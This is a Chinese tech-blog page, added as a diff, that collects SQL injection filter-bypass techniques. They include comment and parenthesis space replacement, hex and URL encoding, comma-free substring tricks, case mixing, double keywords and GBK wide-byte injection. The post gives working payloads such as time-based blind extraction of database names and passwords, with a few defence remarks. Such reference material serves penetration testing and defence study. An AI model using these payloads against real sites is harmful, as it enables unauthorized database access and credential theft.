@@ -1,0 +1,378 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>sql绕过方法笔记 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-01-28">2021-01-28</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">sql绕过方法笔记</h2>
+            <div class="post-meta">
+                emm... 3102 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>在网上找了不少sql绕过的总结，下面搬运一篇我觉得总结的最简单明了的笔记。  </p>
+<h1 id="一、绕过空格（注释符-，-a0）"><a href="#一、绕过空格（注释符-，-a0）" class="headerlink" title="一、绕过空格（注释符/* */，%a0）"></a>一、绕过空格（注释符/* */，%a0）</h1><p>1.两个空格代替一个空格（双写）</p>
+<p>2.%a0=空格</p>
+<p>3.最基本的绕过方法，用注释替换空格：/<em>注释/</em></p>
+<p>4.括号绕过空格</p>
+<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
+<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>例如：time based盲注：</p>
+<blockquote>
+<p>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</p>
+</blockquote>
+<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
+<h1 id="二、引号绕过（使用十六进制）"><a href="#二、引号绕过（使用十六进制）" class="headerlink" title="二、引号绕过（使用十六进制）"></a>二、引号绕过（使用十六进制）</h1><p>会使用到引号的地方一般是在最后的where子句中。这个时候如果引号被过滤了，那么where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</p>
+<p>几乎没有任何注入能过滤十六进制。</p>
+<h1 id="三、逗号绕过（使用from或者offset）"><a href="#三、逗号绕过（使用from或者offset）" class="headerlink" title="三、逗号绕过（使用from或者offset）"></a>三、逗号绕过（使用from或者offset）</h1><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。</p>
+<p>例如：</p>
+<p>使用from to：</p>
+<blockquote>
+<p>select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);</p>
+</blockquote>
+<p>使用join：</p>
+<blockquote>
+<p>union select 1,2<br>union select * from (select 1)a join (select 2)b</p>
+</blockquote>
+<p>使用like：</p>
+<blockquote>
+<p>select ascii(mid(user(),1,1))=80 #等价于<br>select user() like ‘r%’</p>
+</blockquote>
+<p>使用offset来绕过limit中的”，”：</p>
+<blockquote>
+<p>select * from news limit 0,1<br>select * from news limit 1 offset 0</p>
+</blockquote>
+<h1 id="四、比较符号（-lt-gt-）绕过"><a href="#四、比较符号（-lt-gt-）绕过" class="headerlink" title="四、比较符号（&lt;&gt;）绕过"></a>四、比较符号（&lt;&gt;）绕过</h1><p>过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本</p>
+<p>盲注的时候如果无法使用比较操作符，可使用greatest()、least()。（前者返回最大值，后者返回最小值）</p>
+<blockquote>
+<p>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64<br>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</p>
+</blockquote>
+<p>使用between and：</p>
+<p>between a and b：返回a，b之间的数据，不包含b。</p>
+<h1 id="五、or-and-xor-not绕过"><a href="#五、or-and-xor-not绕过" class="headerlink" title="五、or and xor not绕过"></a>五、or and xor not绕过</h1><blockquote>
+<p>and=&amp;&amp; ， or=|| ， xor=| ， not=!</p>
+</blockquote>
+<h1 id="六、绕过注释符号（-，–-后面跟一个空格））过滤"><a href="#六、绕过注释符号（-，–-后面跟一个空格））过滤" class="headerlink" title="六、绕过注释符号（#，–(后面跟一个空格））过滤"></a>六、绕过注释符号（#，–(后面跟一个空格））过滤</h1><blockquote>
+<p>id=1’ union select 1,2,3||’1</p>
+</blockquote>
+<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
+<blockquote>
+<p>id=1’ union select 1,2,’3</p>
+</blockquote>
+<h1 id="七、-绕过"><a href="#七、-绕过" class="headerlink" title="七、= 绕过"></a>七、= 绕过</h1><p>使用like 、rlike 、regexp(正则表达式) 或者 使用&lt; 或者 &gt;</p>
+<h1 id="八、绕过union，select，where等"><a href="#八、绕过union，select，where等" class="headerlink" title="八、绕过union，select，where等"></a>八、绕过union，select，where等</h1><h2 id="1-使用注释符绕过："><a href="#1-使用注释符绕过：" class="headerlink" title="1.使用注释符绕过："></a>1.使用注释符绕过：</h2><p>常用注释符：</p>
+<blockquote>
+<p>//，– , /**/, #, –+, – -, ; , %00 , –a</p>
+</blockquote>
+<p>用法：</p>
+<blockquote>
+<p>U/ * * / NION / * * / SE /* */LECT/ * */user，pwd from user</p>
+</blockquote>
+<h2 id="2-使用大小写绕过："><a href="#2-使用大小写绕过：" class="headerlink" title="2.使用大小写绕过："></a>2.使用大小写绕过：</h2><blockquote>
+<p>id=-1’UnIoN/**/SeLeCT</p>
+</blockquote>
+<h2 id="3-内联注释绕过："><a href="#3-内联注释绕过：" class="headerlink" title="3.内联注释绕过："></a>3.内联注释绕过：</h2><blockquote>
+<p>id=-1’/* !UnIoN* / SeLeCT 1,2,concat(/ * !tabl _ name * /) FrOM / * information _ schema* /.tables / * !WHERE * // * !TaBlE_ScHeMa*/ like database()#</p>
+</blockquote>
+<h2 id="4-双关键字绕过"><a href="#4-双关键字绕过" class="headerlink" title="4.双关键字绕过"></a>4.双关键字绕过</h2><p>若删除掉第一个匹配的union就能绕过：</p>
+<blockquote>
+<p>id=-1’UNIunionONSeLselectECT1,2,3–</p>
+</blockquote>
+<h2 id="5-使用URLencode，ascii编码，"><a href="#5-使用URLencode，ascii编码，" class="headerlink" title="5.使用URLencode，ascii编码，"></a>5.使用URLencode，ascii编码，</h2><blockquote>
+<p>%53%45%4c%45%43%54(ascii)</p>
+</blockquote>
+<h2 id="6-函数或特殊符号"><a href="#6-函数或特殊符号" class="headerlink" title="6.函数或特殊符号"></a>6.函数或特殊符号</h2><p>例如：表示admin，oracle中可以用 ‘adm’||’in’ , mysql中可以用 concat(‘adm’,’in’); mssql中可以用：’adm’+’in’</p>
+<h1 id="九、通用绕过（编码）"><a href="#九、通用绕过（编码）" class="headerlink" title="九、通用绕过（编码）"></a>九、通用绕过（编码）</h1><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<p>如:urlencode: or 1=1即%6f%72%20%31%3d%31</p>
+<p>ASCII : Test可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<h1 id="十、等价函数绕过（不同数据库）"><a href="#十、等价函数绕过（不同数据库）" class="headerlink" title="十、等价函数绕过（不同数据库）"></a>十、等价函数绕过（不同数据库）</h1><blockquote>
+<p>hex()、bin() ==&gt; ascii()<br>sleep() ==&gt;benchmark()<br>concat_ws()==&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@@user ==&gt; user()<br>@@datadir ==&gt; datadir()  </p>
+</blockquote>
+<p>例如：substring()和substr()无法使用时：</p>
+<blockquote>
+<p>?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</p>
+</blockquote>
+<p>或者：</p>
+<blockquote>
+<p>substr((select ‘password’),1,1) = 0x70<br>strcmp(left(‘password’,1), 0x69) = 1<br>strcmp(left(‘password’,1), 0x70) = 0<br>strcmp(left(‘password’,1), 0x71) = -1</p>
+</blockquote>
+<h1 id="十一-宽字节注入"><a href="#十一-宽字节注入" class="headerlink" title="十一.宽字节注入"></a>十一.宽字节注入</h1><p>过滤’的时候往往利用的思路是将 ’ 转换为 ’ 。</p>
+<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
+<p>（1）%df 吃掉 \ 具体的方法是 urlencode(’) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<blockquote>
+<p>id=-1%df%27union select 1,user(),3–+</p>
+</blockquote>
+<p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
+<p>一般产生宽字节注入的PHP函数：</p>
+<p>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \ 转为 \，将 “ 转为 “ 。用思路一。</p>
+<p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p>
+<p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p>
+<p>3.mysql_real_escape_string()：转义下列字符：</p>
+<p>\x00 \n \r \ ’ “ \x1a</p>
+<p>（防御，将mysql设置为gbk即可）</p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
